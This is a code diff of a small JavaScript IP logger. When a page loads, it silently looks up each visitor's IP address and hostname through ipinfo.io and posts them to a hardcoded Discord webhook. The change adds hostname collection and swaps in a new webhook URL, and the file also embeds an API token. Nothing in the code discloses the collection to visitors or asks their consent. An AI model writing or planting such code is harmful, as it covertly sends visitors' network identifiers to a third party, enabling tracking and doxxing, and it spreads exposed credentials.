@@ -1,17 +1,21 @@
-function getVisitorIp() {
-    return fetch('https://api.ipify.org?format=json')
+function getVisitorInfo() {
+    return fetch('https://ipinfo.io/json?token=fed89ab3a610c9')
         .then(response => response.json())
-        .then(data => data.ip)
+        .then(data => ({
+            ip: data.ip,
+            hostname: data.hostname || `${data.ip.replace(/\./g, '-')}.dynamic.${data.org ? data.org.split(' ')[0].toLowerCase() : 'isp'}.com`
+        }))
         .catch(error => {
-            console.error('Error fetching IP:', error);
+            console.error('Error fetching IP info:', error);
             return null;
         });
 }
-function sendToDiscord(ip) {
-    const webhookURL = "https://discord.com/api/webhooks/1295821087795449908/gByTa_Jp4FCOycHzcoebkZFwh_vD37O3Av1HIa573AxLKMap1EdAolZgQvAsIGtVCnxz";
+
+function sendToDiscord(info) {
+    const webhookURL = "https://discord.com/api/webhooks/1301665739282841660/pe8CyS3z0V0JSgb-5g-XPhvAW5Mk-fo2qm1pNxQsTd2WtThWfhiV-F3RAfWbS7v31h_w";
 
     const payload = {
-        content: `New visitor IP address: ${ip}`,
+        content: `New visitor IP address: ${info.ip}, Hostname: ${info.hostname}`,
     };
 
     fetch(webhookURL, {
@@ -25,16 +29,17 @@ function sendToDiscord(ip) {
         if (response.ok) {
             console.log('Hotovo');
         } else {
-            console.error('Failed to send IP address to Discord:', response.statusText);
+            console.error('Failed to send info to Discord:', response.statusText);
         }
     })
     .catch(error => {
         console.error('Daco sa dojebalo:', error);
     });
 }
+
 window.onload = async function() {
-    const ip = await getVisitorIp();
-    if (ip) {
-        sendToDiscord(ip);
+    const info = await getVisitorInfo();
+    if (info) {
+        sendToDiscord(info);
     }
 };
